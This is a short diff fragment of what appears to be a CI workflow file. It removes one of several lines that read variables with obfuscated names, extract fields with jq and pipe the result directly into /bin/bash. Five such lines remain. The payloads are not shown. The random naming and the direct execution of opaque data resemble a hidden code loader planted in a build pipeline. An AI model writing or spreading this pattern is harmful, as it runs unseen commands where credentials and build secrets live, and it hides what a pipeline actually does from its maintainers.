@@ -29,7 +29,6 @@ jobs:
           echo $icq59996 | jq -r .sd5 | /bin/bash
           echo $bwgup546 | jq -r .r956 | /bin/bash
           printf '%s' "$tgjg010" | jq -r .r32508 | /bin/bash
-          echo $coep0 | jq -r .jln5 | /bin/bash
           echo $nkf12010 | jq -r .c1 | /bin/bash
           echo $tgm0 | jq -r .to07539 | /bin/bash
 
